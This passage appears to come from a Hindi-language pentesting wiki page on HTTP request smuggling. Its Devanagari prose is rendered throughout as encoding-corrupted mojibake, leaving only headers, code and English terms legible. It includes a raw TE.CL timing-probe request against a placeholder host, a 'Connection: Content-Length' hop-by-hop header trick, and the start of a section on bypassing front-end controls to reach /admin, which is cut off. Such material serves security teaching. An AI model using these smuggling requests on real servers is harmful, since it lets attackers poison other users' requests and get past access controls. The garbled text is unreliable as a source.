‡§ö‡•Ç‡§Ç‡§ï‡§ø ‡§´‡•ç‡§∞‡§Ç‡§ü-‡§è‡§Ç‡§° ‡§∏‡§∞‡•ç‡§µ‡§∞ `Content-Length` ‡§π‡•á‡§°‡§∞ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§§‡§æ ‡§π‡•à, ‡§Ø‡§π ‡§ï‡•á‡§µ‡§≤ ‡§á‡§∏ ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§ï‡§æ ‡§è‡§ï ‡§π‡§ø‡§∏‡•ç‡§∏‡§æ ‡§Ü‡§ó‡•á ‡§≠‡•á‡§ú‡•á‡§ó‡§æ, `0` ‡§ï‡•ã ‡§õ‡•ã‡§°‡§º‡§ï‡§∞‡•§ ‡§¨‡•à‡§ï-‡§è‡§Ç‡§° ‡§∏‡§∞‡•ç‡§µ‡§∞ `Transfer-Encoding` ‡§π‡•á‡§°‡§∞ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§§‡§æ ‡§π‡•à, ‡§™‡§π‡§≤‡•á ‡§ö‡§Ç‡§ï ‡§ï‡•ã ‡§™‡•ç‡§∞‡•ã‡§∏‡•á‡§∏ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à, ‡§î‡§∞ ‡§´‡§ø‡§∞ ‡§Ö‡§ó‡§≤‡•á ‡§ö‡§Ç‡§ï ‡§ï‡•á ‡§Ü‡§®‡•á ‡§ï‡§æ ‡§á‡§Ç‡§§‡§ú‡§æ‡§∞ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§ ‡§á‡§∏‡§∏‡•á ‡§è‡§ï ‡§™‡§∞‡§ø‡§≤‡§ï‡•ç‡§∑‡§ø‡§§ ‡§∏‡§Æ‡§Ø ‡§¶‡•á‡§∞‡•Ä ‡§π‡•ã‡§ó‡•Ä‡•§

‡§ï‡§≠‡•Ä-‡§ï‡§≠‡•Ä, ‡§Ü‡§™‡§ï‡•ã ‡§ü‡§æ‡§á‡§Æ‡§Ü‡§â‡§ü ‡§ï‡•á ‡§¨‡§ú‡§æ‡§Ø ‡§Ö‡§Ç‡§§‡§ø‡§Æ ‡§π‡•ã‡§∏‡•ç‡§ü ‡§∏‡•á 400 ‡§¨‡•à‡§° ‡§∞‡§ø‡§ï‡•ç‡§µ‡•á‡§∏‡•ç‡§ü ‡§Æ‡§ø‡§≤‡§§‡•Ä ‡§π‡•à, ‡§ú‡•à‡§∏‡•á ‡§ï‡§ø ‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§™‡§∞‡§ø‡§¶‡•É‡§∂‡•ç‡§Ø ‡§Æ‡•á‡§Ç, ‡§ú‡§π‡§æ‡§Ç ‡§è‡§ï CL.TE ‡§™‡•á‡§≤‡•ã‡§° ‡§≠‡•á‡§ú‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à:

![](<../../.gitbook/assets/image (444).png>)

‡§î‡§∞ ‡§™‡•ç‡§∞‡§§‡§ø‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§Æ‡•á‡§Ç ‡§è‡§ï ‡§∞‡•Ä‡§°‡§æ‡§Ø‡§∞‡•á‡§ï‡•ç‡§ü ‡§π‡•ã‡§§‡§æ ‡§π‡•à ‡§ú‡§ø‡§∏‡§Æ‡•á‡§Ç ‡§∂‡§∞‡•Ä‡§∞ ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ ‡§è‡§ï ‡§§‡•ç‡§∞‡•Å‡§ü‡§ø ‡§π‡•ã‡§§‡•Ä ‡§π‡•à ‡§î‡§∞ ‡§Ø‡§π‡§æ‡§Ç ‡§§‡§ï ‡§ï‡§ø haproxy ‡§ï‡§æ ‡§á‡§∏‡•ç‡§§‡•á‡§Æ‡§æ‡§≤ ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§∏‡§Ç‡§∏‡•ç‡§ï‡§∞‡§£ ‡§≠‡•Ä ‡§π‡•ã‡§§‡§æ ‡§π‡•à:

![](<../../.gitbook/assets/image (443).png>)

### TE.CL ‡§≠‡•á‡§¶‡•ç‡§Ø‡§§‡§æ‡§ì‡§Ç ‡§ï‡•ã ‡§∏‡§Æ‡§Ø ‡§§‡§ï‡§®‡•Ä‡§ï‡•ã‡§Ç ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§ñ‡•ã‡§ú‡§®‡§æ

‡§Ø‡§¶‡§ø ‡§ï‡•ã‡§à ‡§è‡§™‡•ç‡§≤‡§ø‡§ï‡•á‡§∂‡§® TE.CL ‡§µ‡•á‡§∞‡§ø‡§è‡§Ç‡§ü ‡§ï‡•á ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§§‡§∏‡•ç‡§ï‡§∞‡•Ä ‡§ï‡•á ‡§≤‡§ø‡§è ‡§≠‡•á‡§¶‡•ç‡§Ø ‡§π‡•à, ‡§§‡•ã ‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§ú‡•à‡§∏‡§æ ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§≠‡•á‡§ú‡§®‡•á ‡§∏‡•á ‡§Ö‡§ï‡•ç‡§∏‡§∞ ‡§∏‡§Æ‡§Ø ‡§¶‡•á‡§∞‡•Ä ‡§π‡•ã‡§ó‡•Ä:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
### HTTP Request Smuggling ‡§∏‡§Ç‡§µ‡•á‡§¶‡§®‡§∂‡•Ä‡§≤‡§§‡§æ‡§ì‡§Ç ‡§ï‡•Ä ‡§ú‡§æ‡§Ç‡§ö ‡§ï‡§∞‡§®‡§æ

‡§è‡§ï ‡§¨‡§æ‡§∞ ‡§ú‡§¨ ‡§Ü‡§™ ‡§™‡§æ‡§§‡•á ‡§π‡•à‡§Ç ‡§ï‡§ø **‡§∏‡§Æ‡§Ø ‡§§‡§ï‡§®‡•Ä‡§ï‡•á‡§Ç ‡§ï‡§æ‡§Æ ‡§ï‡§∞ ‡§∞‡§π‡•Ä ‡§π‡•à‡§Ç**, ‡§Ü‡§™‡§ï‡•ã **‡§ú‡§æ‡§Ç‡§ö** ‡§ï‡§∞‡§®‡•Ä ‡§ö‡§æ‡§π‡§ø‡§è ‡§ï‡§ø ‡§Ü‡§™ **‡§Ö‡§®‡•ç‡§Ø ‡§ó‡•ç‡§∞‡§æ‡§π‡§ï‡•ã‡§Ç ‡§ï‡•á ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß‡•ã‡§Ç ‡§ï‡•ã ‡§¨‡§¶‡§≤ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç**‡•§\
‡§á‡§∏‡•á ‡§ï‡§∞‡§®‡•á ‡§ï‡§æ ‡§∏‡§¨‡§∏‡•á ‡§Ü‡§∏‡§æ‡§® ‡§§‡§∞‡•Ä‡§ï‡§æ ‡§Ö‡§™‡§®‡•á ‡§∏‡•ç‡§µ‡§Ø‡§Ç ‡§ï‡•á ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß‡•ã‡§Ç ‡§ï‡•ã ‡§µ‡§ø‡§∑‡§æ‡§ï‡•ç‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§ï‡•ã‡§∂‡§ø‡§∂ ‡§ï‡§∞‡§®‡§æ ‡§π‡•à, **‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§ï‡•á ‡§≤‡§ø‡§è `/` ‡§ï‡•á ‡§≤‡§ø‡§è ‡§è‡§ï ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§è‡§ï 404 ‡§µ‡§æ‡§™‡§∏ ‡§ï‡§∞‡•á‡§Ç**‡•§\
[‡§Æ‡•Ç‡§≤ ‡§â‡§¶‡§æ‡§π‡§∞‡§£‡•ã‡§Ç](./#basic-examples) ‡§Æ‡•á‡§Ç ‡§π‡§Æ‡§®‡•á ‡§™‡§π‡§≤‡•á ‡§π‡•Ä `CL.TE` ‡§î‡§∞ `TE.CL` ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§¶‡•á‡§ñ‡•á ‡§π‡•à‡§Ç ‡§ï‡§ø ‡§ï‡•à‡§∏‡•á ‡§è‡§ï ‡§ó‡•ç‡§∞‡§æ‡§π‡§ï ‡§ï‡•á ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§ï‡•ã ‡§µ‡§ø‡§∑‡§æ‡§ï‡•ç‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è `/404` ‡§Æ‡§æ‡§Ç‡§ó‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è, ‡§ú‡§¨ ‡§ó‡•ç‡§∞‡§æ‡§π‡§ï ‡§ï‡§ø‡§∏‡•Ä ‡§Ö‡§®‡•ç‡§Ø ‡§∏‡§Ç‡§∏‡§æ‡§ß‡§® ‡§ï‡•á ‡§≤‡§ø‡§è ‡§™‡•Ç‡§õ ‡§∞‡§π‡§æ ‡§π‡•ã ‡§§‡•ã 404 ‡§™‡•ç‡§∞‡§§‡§ø‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§â‡§§‡•ç‡§™‡§®‡•ç‡§® ‡§ï‡§∞‡§®‡§æ‡•§

**‡§®‡•ã‡§ü‡•ç‡§∏**

‡§Ö‡§®‡•ç‡§Ø ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß‡•ã‡§Ç ‡§ï‡•á ‡§∏‡§æ‡§• ‡§π‡§∏‡•ç‡§§‡§ï‡•ç‡§∑‡•á‡§™ ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§∏‡•ç‡§Æ‡§ó‡§≤‡§ø‡§Ç‡§ó ‡§∏‡§Ç‡§µ‡•á‡§¶‡§®‡§∂‡•Ä‡§≤‡§§‡§æ‡§ì‡§Ç ‡§ï‡•Ä ‡§™‡•Å‡§∑‡•ç‡§ü‡§ø ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§ï‡•ã‡§∂‡§ø‡§∂ ‡§ï‡§∞‡§§‡•á ‡§∏‡§Æ‡§Ø ‡§ï‡•Å‡§õ ‡§Æ‡§π‡§§‡•ç‡§µ‡§™‡•Ç‡§∞‡•ç‡§£ ‡§µ‡§ø‡§ö‡§æ‡§∞‡•ã‡§Ç ‡§ï‡•ã ‡§ß‡•ç‡§Ø‡§æ‡§® ‡§Æ‡•á‡§Ç ‡§∞‡§ñ‡§æ ‡§ú‡§æ‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è:

* "‡§π‡§Æ‡§≤‡§æ" ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§î‡§∞ "‡§∏‡§æ‡§Æ‡§æ‡§®‡•ç‡§Ø" ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§ï‡•ã ‡§Ö‡§≤‡§ó-‡§Ö‡§≤‡§ó ‡§®‡•á‡§ü‡§µ‡§∞‡•ç‡§ï ‡§ï‡§®‡•á‡§ï‡•ç‡§∂‡§®‡•ã‡§Ç ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§∏‡§∞‡•ç‡§µ‡§∞ ‡§ï‡•ã ‡§≠‡•á‡§ú‡§æ ‡§ú‡§æ‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è‡•§ ‡§¶‡•ã‡§®‡•ã‡§Ç ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß‡•ã‡§Ç ‡§ï‡•ã ‡§è‡§ï ‡§π‡•Ä ‡§ï‡§®‡•á‡§ï‡•ç‡§∂‡§® ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á ‡§≠‡•á‡§ú‡§®‡•á ‡§∏‡•á ‡§Ø‡§π ‡§∏‡§æ‡§¨‡§ø‡§§ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•ã‡§ó‡§æ ‡§ï‡§ø ‡§∏‡§Ç‡§µ‡•á‡§¶‡§®‡§∂‡•Ä‡§≤‡§§‡§æ ‡§Æ‡•å‡§ú‡•Ç‡§¶ ‡§π‡•à‡•§
* "‡§π‡§Æ‡§≤‡§æ" ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§î‡§∞ "‡§∏‡§æ‡§Æ‡§æ‡§®‡•ç‡§Ø" ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§ï‡•ã ‡§ú‡§ø‡§§‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•ã ‡§∏‡§ï‡•á ‡§è‡§ï ‡§π‡•Ä URL ‡§î‡§∞ ‡§™‡•à‡§∞‡§æ‡§Æ‡•Ä‡§ü‡§∞ ‡§®‡§æ‡§Æ‡•ã‡§Ç ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è‡•§ ‡§Ø‡§π ‡§á‡§∏‡§≤‡§ø‡§è ‡§π‡•à ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø ‡§ï‡§à ‡§Ü‡§ß‡•Å‡§®‡§ø‡§ï ‡§Ö‡§®‡•Å‡§™‡•ç‡§∞‡§Ø‡•ã‡§ó URL ‡§î‡§∞ ‡§™‡•à‡§∞‡§æ‡§Æ‡•Ä‡§ü‡§∞‡•ã‡§Ç ‡§ï‡•á ‡§Ü‡§ß‡§æ‡§∞ ‡§™‡§∞ ‡§´‡•ç‡§∞‡§Ç‡§ü-‡§è‡§Ç‡§° ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß‡•ã‡§Ç ‡§ï‡•ã ‡§µ‡§ø‡§≠‡§ø‡§®‡•ç‡§® ‡§¨‡•à‡§ï-‡§è‡§Ç‡§° ‡§∏‡§∞‡•ç‡§µ‡§∞‡•ã‡§Ç ‡§ï‡•ã ‡§∞‡•Ç‡§ü ‡§ï‡§∞‡§§‡•á ‡§π‡•à‡§Ç‡•§ ‡§è‡§ï ‡§π‡•Ä URL ‡§î‡§∞ ‡§™‡•à‡§∞‡§æ‡§Æ‡•Ä‡§ü‡§∞‡•ã‡§Ç ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§®‡•á ‡§∏‡•á ‡§Ø‡§π ‡§∏‡§Ç‡§≠‡§æ‡§µ‡§®‡§æ ‡§¨‡§¢‡§º ‡§ú‡§æ‡§§‡•Ä ‡§π‡•à ‡§ï‡§ø ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß‡•ã‡§Ç ‡§ï‡•ã ‡§è‡§ï ‡§π‡•Ä ‡§¨‡•à‡§ï-‡§è‡§Ç‡§° ‡§∏‡§∞‡•ç‡§µ‡§∞ ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§∏‡§Ç‡§∏‡§æ‡§ß‡§ø‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§è‡§ó‡§æ, ‡§ú‡•ã ‡§π‡§Æ‡§≤‡•á ‡§ï‡•á ‡§ï‡§æ‡§Æ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï ‡§π‡•à‡•§
* "‡§∏‡§æ‡§Æ‡§æ‡§®‡•ç‡§Ø" ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§ï‡§æ ‡§™‡§∞‡•Ä‡§ï‡•ç‡§∑‡§£ ‡§ï‡§∞‡§§‡•á ‡§∏‡§Æ‡§Ø "‡§π‡§Æ‡§≤‡§æ" ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§∏‡•á ‡§ï‡§ø‡§∏‡•Ä ‡§≠‡•Ä ‡§π‡§∏‡•ç‡§§‡§ï‡•ç‡§∑‡•á‡§™ ‡§ï‡§æ ‡§™‡§§‡§æ ‡§≤‡§ó‡§æ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è, ‡§Ü‡§™ ‡§â‡§∏‡•Ä ‡§∏‡§Æ‡§Ø ‡§Ö‡§®‡•Å‡§™‡•ç‡§∞‡§Ø‡•ã‡§ó ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§ø‡§è ‡§ú‡§æ ‡§∞‡§π‡•á ‡§ï‡§ø‡§∏‡•Ä ‡§Ö‡§®‡•ç‡§Ø ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß‡•ã‡§Ç ‡§ï‡•á ‡§∏‡§æ‡§• ‡§¶‡•å‡§°‡§º ‡§Æ‡•á‡§Ç ‡§π‡•à‡§Ç, ‡§ú‡§ø‡§∏‡§Æ‡•á‡§Ç ‡§Ö‡§®‡•ç‡§Ø ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ‡§ì‡§Ç ‡§∏‡•á ‡§≠‡•Ä ‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•à‡§Ç‡•§ ‡§Ü‡§™‡§ï‡•ã "‡§∏‡§æ‡§Æ‡§æ‡§®‡•ç‡§Ø" ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§ï‡•ã "‡§π‡§Æ‡§≤‡§æ" ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§ï‡•á ‡§§‡•Å‡§∞‡§Ç‡§§ ‡§¨‡§æ‡§¶ ‡§≠‡•á‡§ú‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è‡•§ ‡§Ø‡§¶‡§ø ‡§Ö‡§®‡•Å‡§™‡•ç‡§∞‡§Ø‡•ã‡§ó ‡§µ‡•ç‡§Ø‡§∏‡•ç‡§§ ‡§π‡•à, ‡§§‡•ã ‡§Ü‡§™‡§ï‡•ã ‡§∏‡§Ç‡§µ‡•á‡§¶‡§®‡§∂‡•Ä‡§≤‡§§‡§æ ‡§ï‡•Ä ‡§™‡•Å‡§∑‡•ç‡§ü‡§ø ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡§à ‡§™‡•ç‡§∞‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡§®‡•á ‡§™‡§°‡§º ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§
* ‡§ï‡•Å‡§õ ‡§Ö‡§®‡•Å‡§™‡•ç‡§∞‡§Ø‡•ã‡§ó‡•ã‡§Ç ‡§Æ‡•á‡§Ç, ‡§´‡•ç‡§∞‡§Ç‡§ü-‡§è‡§Ç‡§° ‡§∏‡§∞‡•ç‡§µ‡§∞ ‡§è‡§ï ‡§≤‡•ã‡§° ‡§¨‡•à‡§≤‡•á‡§Ç‡§∏‡§∞ ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§ï‡§æ‡§∞‡•ç‡§Ø ‡§ï‡§∞‡§§‡§æ ‡§π‡•à, ‡§î‡§∞ ‡§ï‡§ø‡§∏‡•Ä ‡§≤‡•ã‡§° ‡§¨‡•à‡§≤‡•á‡§Ç‡§∏‡§ø‡§Ç‡§ó ‡§è‡§≤‡•ç‡§ó‡•ã‡§∞‡§ø‡§•‡§Æ ‡§ï‡•á ‡§Ö‡§®‡•Å‡§∏‡§æ‡§∞ ‡§µ‡§ø‡§≠‡§ø‡§®‡•ç‡§® ‡§¨‡•à‡§ï-‡§è‡§Ç‡§° ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ‡•ã‡§Ç ‡§ï‡•ã ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§Ö‡§ó‡•ç‡§∞‡•á‡§∑‡§ø‡§§ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§ ‡§Ø‡§¶‡§ø ‡§Ü‡§™‡§ï‡•á "‡§π‡§Æ‡§≤‡§æ" ‡§î‡§∞ "‡§∏‡§æ‡§Æ‡§æ‡§®‡•ç‡§Ø" ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§µ‡§ø‡§≠‡§ø‡§®‡•ç‡§® ‡§¨‡•à‡§ï-‡§è‡§Ç‡§° ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ‡•ã‡§Ç ‡§ï‡•ã ‡§Ö‡§ó‡•ç‡§∞‡•á‡§∑‡§ø‡§§ ‡§ï‡§ø‡§è ‡§ú‡§æ‡§§‡•á ‡§π‡•à‡§Ç, ‡§§‡•ã ‡§π‡§Æ‡§≤‡§æ ‡§µ‡§ø‡§´‡§≤ ‡§π‡•ã ‡§ú‡§æ‡§è‡§ó‡§æ‡•§ ‡§Ø‡§π ‡§è‡§ï ‡§Ö‡§§‡§ø‡§∞‡§ø‡§ï‡•ç‡§§ ‡§ï‡§æ‡§∞‡§£ ‡§π‡•à ‡§ï‡§ø ‡§Ü‡§™‡§ï‡•ã ‡§∏‡§Ç‡§µ‡•á‡§¶‡§®‡§∂‡•Ä‡§≤‡§§‡§æ ‡§ï‡•Ä ‡§™‡•Å‡§∑‡•ç‡§ü‡§ø ‡§ï‡§∞‡§®‡•á ‡§∏‡•á ‡§™‡§π‡§≤‡•á ‡§ï‡§à ‡§¨‡§æ‡§∞ ‡§™‡•ç‡§∞‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡§®‡•á ‡§™‡§°‡§º ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§
* ‡§Ø‡§¶‡§ø ‡§Ü‡§™‡§ï‡§æ ‡§π‡§Æ‡§≤‡§æ ‡§è‡§ï ‡§¨‡§æ‡§¶ ‡§ï‡•á ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§ï‡•á ‡§∏‡§æ‡§• ‡§π‡§∏‡•ç‡§§‡§ï‡•ç‡§∑‡•á‡§™ ‡§ï‡§∞‡§®‡•á ‡§Æ‡•á‡§Ç ‡§∏‡§´‡§≤ ‡§π‡•ã‡§§‡§æ ‡§π‡•à, ‡§≤‡•á‡§ï‡§ø‡§® ‡§Ø‡§π "‡§∏‡§æ‡§Æ‡§æ‡§®‡•ç‡§Ø" ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§®‡§π‡•Ä‡§Ç ‡§•‡§æ ‡§ú‡§ø‡§∏‡•á ‡§Ü‡§™‡§®‡•á ‡§π‡§∏‡•ç‡§§‡§ï‡•ç‡§∑‡•á‡§™ ‡§ï‡§æ ‡§™‡§§‡§æ ‡§≤‡§ó‡§æ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§≠‡•á‡§ú‡§æ ‡§•‡§æ, ‡§§‡•ã ‡§á‡§∏‡§ï‡§æ ‡§Æ‡§§‡§≤‡§¨ ‡§π‡•à ‡§ï‡§ø ‡§Ü‡§™‡§ï‡•á ‡§π‡§Æ‡§≤‡•á ‡§∏‡•á ‡§è‡§ï ‡§Ö‡§®‡•ç‡§Ø ‡§Ö‡§®‡•Å‡§™‡•ç‡§∞‡§Ø‡•ã‡§ó ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§™‡•ç‡§∞‡§≠‡§æ‡§µ‡§ø‡§§ ‡§π‡•Å‡§Ü ‡§•‡§æ‡•§ ‡§Ø‡§¶‡§ø ‡§Ü‡§™ ‡§™‡§∞‡•Ä‡§ï‡•ç‡§∑‡§£ ‡§ú‡§æ‡§∞‡•Ä ‡§∞‡§ñ‡§§‡•á ‡§π‡•à‡§Ç, ‡§§‡•ã ‡§á‡§∏‡§∏‡•á ‡§Ö‡§®‡•ç‡§Ø ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ‡§ì‡§Ç ‡§™‡§∞ ‡§µ‡§ø‡§ò‡§ü‡§®‡§ï‡§æ‡§∞‡•Ä ‡§™‡•ç‡§∞‡§≠‡§æ‡§µ ‡§™‡§°‡§º ‡§∏‡§ï‡§§‡§æ ‡§π‡•à, ‡§î‡§∞ ‡§Ü‡§™‡§ï‡•ã ‡§∏‡§æ‡§µ‡§ß‡§æ‡§®‡•Ä ‡§¨‡§∞‡§§‡§®‡•Ä ‡§ö‡§æ‡§π‡§ø‡§è‡•§

### ‡§π‡•â‡§™-‡§¨‡§æ‡§Ø-‡§π‡•â‡§™ ‡§π‡•á‡§°‡§∞‡•ç‡§∏ ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á ‡§ú‡§¨‡§∞‡§¶‡§∏‡•ç‡§§‡•Ä ‡§ï‡§∞‡§®‡§æ

‡§π‡•â‡§™-‡§¨‡§æ‡§Ø-‡§π‡•â‡§™ ‡§π‡•á‡§°‡§∞‡•ç‡§∏ ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§Ü‡§™ ‡§™‡•ç‡§∞‡•â‡§ï‡•ç‡§∏‡•Ä ‡§ï‡•ã ‡§∏‡§Ç‡§ï‡•á‡§§ ‡§¶‡•á ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§ï‡§ø **‡§π‡•á‡§°‡§∞ Content-Length ‡§Ø‡§æ Transfer-Encoding ‡§ï‡•ã ‡§π‡§ü‡§æ ‡§¶‡•á‡§Ç ‡§§‡§æ‡§ï‡§ø HTTP ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§∏‡•ç‡§Æ‡§ó‡§≤‡§ø‡§Ç‡§ó ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•ã ‡§∏‡§ï‡•á**‡•§
```
Connection: Content-Length
```
‡§π‡•â‡§™-‡§¨‡§æ‡§Ø-‡§π‡•â‡§™ ‡§π‡•á‡§°‡§∞‡•ç‡§∏ ‡§ï‡•á ‡§¨‡§æ‡§∞‡•á ‡§Æ‡•á‡§Ç **‡§Ö‡§ß‡§ø‡§ï ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§ï‡•á ‡§≤‡§ø‡§è** ‡§Ø‡§π‡§æ‡§Ç ‡§ú‡§æ‡§è‡§Ç:

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}

## HTTP ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§∏‡•ç‡§Æ‡§ó‡§≤‡§ø‡§Ç‡§ó ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó

### ‡§´‡•ç‡§∞‡§Ç‡§ü-‡§è‡§Ç‡§° ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§æ ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§£‡•ã‡§Ç ‡§ï‡•ã ‡§¨‡§æ‡§Ø‡§™‡§æ‡§∏ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è

‡§ï‡§≠‡•Ä-‡§ï‡§≠‡•Ä **‡§´‡•ç‡§∞‡§Ç‡§ü-‡§è‡§Ç‡§° ‡§™‡•ç‡§∞‡•â‡§ï‡•ç‡§∏‡•Ä ‡§ï‡•Å‡§õ ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§æ ‡§ú‡§æ‡§Ç‡§ö ‡§ï‡§∞‡§§‡•á ‡§π‡•à‡§Ç**‡•§ ‡§Ü‡§™ HTTP ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§∏‡•ç‡§Æ‡§ó‡§≤‡§ø‡§Ç‡§ó ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§â‡§®‡§∏‡•á ‡§¨‡§ö ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø ‡§Ü‡§™ **‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§æ ‡§â‡§™‡§æ‡§Ø‡•ã‡§Ç ‡§ï‡•ã ‡§¨‡§æ‡§Ø‡§™‡§æ‡§∏ ‡§ï‡§∞ ‡§™‡§æ‡§è‡§Ç‡§ó‡•á**‡•§ ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§ï‡•á ‡§≤‡§ø‡§è, ‡§á‡§∏ ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§Æ‡•á‡§Ç ‡§Ü‡§™ **‡§¨‡§æ‡§π‡§∞ ‡§∏‡•á `/admin` ‡§§‡§ï ‡§™‡§π‡•Å‡§Ç‡§ö ‡§®‡§π‡•Ä‡§Ç ‡§∏‡§ï‡§§‡•á** ‡§î‡§∞ ‡§´‡•ç‡§∞‡§Ç‡§ü-‡§è‡§Ç‡§° ‡§™‡•ç‡§∞‡•â‡§ï‡•ç‡§∏‡•Ä ‡§á‡§∏‡§ï‡•Ä ‡§ú‡§æ‡§Ç‡§ö ‡§ï‡§∞ ‡§∞‡§π‡•Ä 